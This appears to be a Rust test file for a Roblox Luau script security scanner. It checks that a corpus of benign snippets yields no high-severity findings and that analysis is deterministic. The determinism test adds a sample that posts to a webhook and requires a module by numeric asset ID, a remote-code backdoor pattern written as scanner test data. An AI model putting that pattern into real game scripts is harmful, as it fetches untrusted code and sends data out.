        ("wait for config", "local Config = require(game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Config\"))\nprint(Config.FAKE)".into()),
        ("strict generics", "--!strict\nlocal function map<T, U>(list: { T }, fn: (T) -> U): { U } local out = {} for i, v in list do out[i] = fn(v) end return out end\nreturn map".into()),
        ("testez", "return function()\n\tdescribe(\"FAKE\", function()\n\t\tit(\"adds\", function() expect(1 + 1).to.equal(2) end)\n\tend)\nend".into()),
        ("nevermore", "local require = require(script.Parent.loader).load(script)\nlocal Maid = require(\"Maid\")\nreturn Maid".into()),
        ("process receipt", "local MarketplaceService = game:GetService(\"MarketplaceService\")\nlocal PRODUCTS = { [999000000000950] = function(player) return true end }\nMarketplaceService.ProcessReceipt = function(info) local handler = PRODUCTS[info.ProductId] if handler and handler(info.PlayerId) then return Enum.ProductPurchaseDecision.PurchaseGranted end return Enum.ProductPurchaseDecision.NotProcessedYet end".into()),
        ("in-experience teleport", "local TeleportService = game:GetService(\"TeleportService\")\nlocal function send(player) TeleportService:TeleportAsync(game.PlaceId, { player }) end\nreturn send".into()),
        ("analytics", "local HttpService = game:GetService(\"HttpService\")\nlocal URL = \"https://analytics.example.test/v1/events\"\nlocal function track(event) HttpService:PostAsync(URL, HttpService:JSONEncode({ event = event, time = os.time() })) end\ntrack(\"FAKE_start\")".into()),
        ("gamepass check", "local MarketplaceService = game:GetService(\"MarketplaceService\")\nlocal VIP_PASS = 999000000000951\nlocal function isVip(player) return MarketplaceService:UserOwnsGamePassAsync(player.UserId, VIP_PASS) end\nreturn isVip".into()),
        ("command registry", "local Commands = {}\nfunction Commands.kick(player, target) target:Kick(\"FAKE\") end\nlocal function run(name, ...) local fn = Commands[name] if fn then fn(...) end end\nreturn run".into()),
        ("string utilities", "local function trim(s) return (s:gsub(\"^%s+\", \"\"):gsub(\"%s+$\", \"\")) end\nlocal function split(s) return s:split(\",\") end\nreturn { trim = trim, split = split, upper = string.upper(\"FAKE\") }".into()),
        ("react element tree", "local React = require(script.Parent.React)\nlocal e = React.createElement\nreturn function(props) return e(\"Frame\", { Size = props.size }, { Label = e(\"TextLabel\", { Text = props.text }) }) end".into()),
        ("studio debug", "local RunService = game:GetService(\"RunService\")\nif RunService:IsStudio() then print(\"FAKE debug\", game.PlaceId) end".into()),
        ("rojo init", "local Shared = script.Shared\nlocal Util = require(Shared.Util)\nlocal Remotes = require(script:WaitForChild(\"Remotes\"))\nreturn { Util = Util, Remotes = Remotes }".into()),
        ("lazy require", "local cache = {}\nreturn function(module) if not cache[module] then cache[module] = require(module) end return cache[module] end".into()),
        ("leaderboard", "local Players = game:GetService(\"Players\")\nPlayers.PlayerAdded:Connect(function(player) local stats = Instance.new(\"Folder\") stats.Name = \"leaderstats\" stats.Parent = player print(player.Name .. \" joined\") end)".into()),
        ("data table", data_table(500)),
    ]
}

#[test]
fn clean_corpus_shapes_have_no_high_findings_and_stay_complete() {
    for (label, source) in clean_sources() {
        let report = scan(script_document(&source));
        assert_eq!(
            report.completeness,
            Completeness::Complete,
            "{label}: {:?}",
            report.inputs
        );
        let high: Vec<_> = report
            .findings
            .iter()
            .filter(|finding| finding.severity >= Severity::High)
            .cloned()
            .collect();
        assert!(high.is_empty(), "{label}: {:#?}", describe(&high));
    }
}

#[test]
fn analysis_is_deterministic_across_runs() {
    let mut sources: Vec<String> = clean_sources()
        .into_iter()
        .map(|(_, source)| source)
        .collect();
    sources.push(http(&format!(
        "local function FAKE_post(url, body) return H:PostAsync(url, body) end\nFAKE_post(\"{WEBHOOK}\", \"{{}}\")\nlocal FAKE_id = 999000000000960\nif false then FAKE_id = 0 end\nrequire(FAKE_id)"
    )));
    for source in sources {
        let first = serde_json::to_string(&analysis(&source).findings).unwrap();
        let second = serde_json::to_string(&analysis(&source).findings).unwrap();
        assert_eq!(first, second);
    }
}
